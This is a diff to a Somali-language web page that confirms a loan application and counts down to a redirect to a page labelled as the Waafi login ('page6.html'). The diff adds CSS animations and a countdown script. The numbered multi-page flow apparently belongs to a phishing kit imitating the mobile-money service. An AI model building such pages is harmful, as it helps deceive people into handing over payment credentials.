@@ -12,6 +12,12 @@ body{
   background:#f3f3f3;
   display:flex;
   justify-content:center;
+  animation:fadeIn 0.6s ease;
+}
+
+@keyframes fadeIn{
+  from{opacity:0; transform:translateY(20px);}
+  to{opacity:1; transform:translateY(0);}
 }
 
 .wrapper{
@@ -21,7 +27,7 @@ body{
   text-align:center;
 }
 
-/* TOP SUCCESS MESSAGE */
+/* TOP MESSAGE */
 .toast{
   background:#1f2a38;
   color:white;
@@ -44,7 +50,7 @@ body{
   font-weight:bold;
 }
 
-/* GREEN TICK */
+/* BIG CHECK */
 .bigTick{
   width:90px;
   height:90px;
@@ -56,19 +62,22 @@ body{
   justify-content:center;
   color:white;
   font-size:45px;
+  animation:pop 0.5s ease;
 }
 
-/* TEXTS */
+@keyframes pop{
+  0%{transform:scale(0);}
+  100%{transform:scale(1);}
+}
+
 h1{
   color:#7ac943;
   font-size:26px;
-  margin-bottom:15px;
 }
 
 p{
   color:#666;
   line-height:1.6;
-  font-size:16px;
 }
 
 /* LOADING BOX */
@@ -79,6 +88,25 @@ p{
   margin-top:25px;
   color:#7ac943;
   font-weight:bold;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+}
+
+/* SPINNER */
+.spinner{
+  width:18px;
+  height:18px;
+  border:3px solid #cfcfcf;
+  border-top:3px solid #7ac943;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+  from{transform:rotate(0deg);}
+  to{transform:rotate(360deg);}
 }
 
 /* BUTTON */
@@ -98,41 +126,54 @@ p{
 
 <div class="wrapper">
 
-<!-- TOP DARK MESSAGE -->
 <div class="toast">
   <div class="icon">✓</div>
   <div>🎉 Codsiga si guul leh ayaa loo gudbiyay!</div>
 </div>
 
-<!-- BIG GREEN CHECK -->
 <div class="bigTick">✓</div>
 
 <h1>Codsiga Amaahda waa la gudbiyay</h1>
 
-<p>
-Codsigaaga amaahda waa la gudbiyay. Fadlan sug ansixinta.
-</p>
+<p>Codsigaaga amaahda waa la gudbiyay. Fadlan sug ansixinta.</p>
 
-<p>
-Waxaad heli doontaa farriin xaqiijin ah. Hadda, soco Waafi.
-</p>
+<p>Waxaad heli doontaa farriin xaqiijin ah. Hadda, soco Waafi.</p>
 
 <div class="loading">
-Ku celinaya galitaanka Waafi 4 ilbiriqsi...
+  <div class="spinner"></div>
+  <span id="countText">
+    Ku celinaya galitaanka Waafi 5 ilbiriqsi...
+  </span>
 </div>
 
-<div class="btn">
-Tag Galitaanka Hadda
-</div>
+<div class="btn">Tag Galitaanka Hadda</div>
 
 </div>
 
 <script>
 
-/* AUTO MOVE AFTER 5 SECONDS */
-setTimeout(function(){
-   window.location.href = "page6.html";
-},5000);
+/* REAL COUNTDOWN */
+let seconds = 5;
+
+const counter = setInterval(function(){
+
+  seconds--;
+
+  document.getElementById("countText").innerText =
+    "Ku celinaya galitaanka Waafi " + seconds + " ilbiriqsi...";
+
+  if(seconds <= 0){
+      clearInterval(counter);
+
+      // smooth transition
+      document.body.style.opacity="0";
+
+      setTimeout(()=>{
+         window.location.href="page6.html";
+      },400);
+  }
+
+},1000);
 
 </script>
 
